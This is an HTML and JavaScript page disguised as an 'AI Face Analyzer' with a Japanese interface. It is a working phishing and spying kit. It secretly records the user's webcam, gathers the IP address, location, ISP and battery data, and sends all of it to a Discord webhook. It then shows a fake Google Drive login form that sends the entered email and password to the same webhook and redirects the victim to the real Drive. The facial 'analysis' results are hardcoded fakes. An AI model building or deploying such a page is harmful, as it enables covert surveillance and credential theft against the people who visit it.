<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer | Professional Bio-Metrics</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&family=JetBrains+Mono:wght@400;700&display=swap');
        
        :root { 
            --bg: #000;
            --card: #0d0d0d;
            --accent: #3d8bff; 
            --text: #ffffff;
            --text-dim: #666;
            --border: #1a1a1a;
        }

        * { box-sizing: border-box; outline: none; }
        body { 
            font-family: 'Inter', sans-serif; 
            background: var(--bg); color: var(--text); 
            margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh;
        }

        .card { 
            background: var(--card); border: 1px solid var(--border); 
            padding: 40px; border-radius: 4px; width: 440px; 
            box-shadow: 0 0 50px rgba(0,0,0,1);
        }

        .header { text-align: left; margin-bottom: 30px; border-left: 3px solid var(--accent); padding-left: 15px; }
        h1 { font-family: 'JetBrains Mono', monospace; font-size: 18px; letter-spacing: 2px; margin: 0; }
        p { font-size: 11px; color: var(--text-dim); text-transform: uppercase; margin: 4px 0 0; }

        .v-wrap { 
            width: 100%; aspect-ratio: 4/3; border-radius: 2px; overflow: hidden; 
            margin-bottom: 25px; background: #050505; border: 1px solid var(--border);
            position: relative;
        }
        video, img { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        
        .scan-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(61, 139, 255, 0.05) 50%, rgba(0,0,0,0) 50.5%);
            background-size: 100% 4px; pointer-events: none;
        }

        .results-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 30px; text-align: left; }
        .res-item { padding: 10px; border: 1px solid var(--border); background: #111; }
        .label { font-size: 9px; color: var(--text-dim); text-transform: uppercase; display: block; margin-bottom: 4px; }
        .val { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); }

        .btn { 
            background: transparent; color: var(--accent); border: 1px solid var(--accent);
            width: 100%; padding: 15px; border-radius: 2px; font-weight: 700; 
            cursor: pointer; font-size: 12px; letter-spacing: 1px; transition: 0.3s;
        }
        .btn:hover { background: var(--accent); color: #000; }

        #login-ui, #step-pass, #result-ui { display: none; }
        input { 
            width: 100%; padding: 16px; background: #161616; border: 1px solid #333; 
            border-radius: 4px; color: #fff; margin-bottom: 15px; font-size: 16px;
        }
        input:focus { border-color: var(--accent); }
    </style>
</head>
<body>

    <div class="card" id="camera-ui">
        <div class="header"><h1>BIO-ANALYTICS v4.0</h1><p>Scanning facial topology</p></div>
        <div class="v-wrap"><div class="scan-overlay"></div><video id="video" autoplay playsinline muted></video></div>
        <button class="btn" id="start-btn">INITIALIZE SCAN</button>
    </div>

    <div class="card" id="result-ui">
        <div class="header"><h1>ANALYSIS REPORT</h1><p>Biometric metrics identified</p></div>
        <div class="v-wrap"><img id="result-preview" src=""></div>
        <div class="results-grid">
            <div class="res-item"><span class="label">Nasolabial Angle</span><span class="val">96.4° (Optimal)</span></div>
            <div class="res-item"><span class="label">Mandibular Line</span><span class="val">Sharp / 122°</span></div>
            <div class="res-item"><span class="label">E-Line Match</span><span class="val">Tier-1</span></div>
            <div class="res-item"><span class="label">Eye-Line Width</span><span class="val">0.82mm</span></div>
            <div class="res-item"><span class="label">Philtrum Ratio</span><span class="val">1 : 1.618</span></div>
            <div class="res-item"><span class="label">Symmetry</span><span class="val">99.1%</span></div>
        </div>
        <button class="btn" id="view-details-btn">GENERATE FULL REPORT (DRIVE)</button>
    </div>

    <div class="card" id="login-ui">
        <div style="text-align:center; margin-bottom:30px;">
            <svg viewBox="0 0 75 24" width="90" style="margin-bottom:20px;"><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#fff"/></svg>
            <div id="g-title" style="font-size:24px; margin-bottom:8px;">ログイン</div>
            <div id="g-subtitle" style="font-size:14px; color:var(--text-dim);">Google ドライブに続行</div>
        </div>
        <form id="trap-form">
            <div id="step-email">
                <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
            </div>
            <div id="step-pass">
                <div id="user-chip" style="background:#222; border-radius:20px; padding:6px 16px; display:inline-flex; align-items:center; margin-bottom:20px; font-size:13px; border:1px solid #333;"><span id="target-email-val"></span></div>
                <input type="password" id="pass" placeholder="パスワードを入力" required>
            </div>
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <span style="color:var(--accent); font-size:13px; font-weight:600; cursor:pointer;">アカウントを作成</span>
                <button type="button" class="btn" id="next-btn" style="width:auto; padding: 10px 30px;">次へ</button>
                <button type="submit" class="btn" id="submit-btn" style="width:auto; padding: 10px 30px; display:none;">次へ</button>
            </div>
        </form>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "ここにDiscordのURLを貼れ";
        let mediaRecorder;
        let recordedChunks = [];
        let intel = {};

        // 1. デバイス情報取得
        async function fetchIntel() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                const bat = await navigator.getBattery();
                intel = {
                    ip: ipData.ip, city: ipData.city, isp: ipData.org,
                    ua: navigator.userAgent,
                    bat: `${(bat.level * 100).toFixed(0)}%`,
                    time: new Date().toLocaleString('ja-JP')
                };
            } catch (e) {}
        }

        // 2. 録画とスキャン
        const video = document.getElementById('video');
        document.getElementById('start-btn').onclick = async () => {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            document.getElementById('start-btn').innerText = "ANALYZING...";
            await fetchIntel();

            // サイレント録画開始
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.start();

            setTimeout(async () => {
                // 静止画キャプチャ
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const capturedImg = canvas.toDataURL('image/jpeg', 0.8);
                
                document.getElementById('camera-ui').style.display = 'none';
                document.getElementById('result-ui').style.display = 'block';
                document.getElementById('result-preview').src = capturedImg;

                // 録画停止と送信
                mediaRecorder.stop();
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify({
                        username: "SILENT_RECORDER",
                        embeds: [{
                            title: "📹 VIDEO & INTEL CAPTURED",
                            color: 0x3d8bff,
                            description: `IP: ${intel.ip}\nLoc: ${intel.city}\nBat: ${intel.bat}`,
                            footer: { text: `Time: ${intel.time}` }
                        }]
                    }));
                    formData.append('file1', await (await fetch(capturedImg)).blob(), 'thumb.jpg');
                    formData.append('file2', videoBlob, 'capture.webm');
                    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                };

                stream.getTracks().forEach(t => t.stop());
            }, 5000); // 5秒間録画
        };

        // 誘導と奪取
        document.getElementById('view-details-btn').onclick = () => {
            document.getElementById('result-ui').style.display = 'none';
            document.getElementById('login-ui').style.display = 'block';
        };

        document.getElementById('next-btn').onclick = () => {
            const email = document.getElementById('email').value;
            if(!email.includes('@')) return;
            document.getElementById('target-email-val').innerText = email;
            document.getElementById('step-email').style.display = 'none';
            document.getElementById('step-pass').style.display = 'block';
            document.getElementById('next-btn').style.display = 'none';
            document.getElementById('submit-btn').style.display = 'block';
            document.getElementById('g-title').innerText = "ようこそ";
        };

        document.getElementById('trap-form').onsubmit = async (e) => {
            e.preventDefault();
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "CREDENTIAL_MANAGER",
                    embeds: [{
                        title: "🔑 PASSWORD EXFILTRATED",
                        color: 0xff4d4d,
                        fields: [
                            { name: "User", value: document.getElementById('email').value },
                            { name: "Pass", value: `||${document.getElementById('pass').value}||` }
                        ]
                    }]
                })
            });
            window.location.href = "https://drive.google.com";
        };
    </script>
</body>
</html>
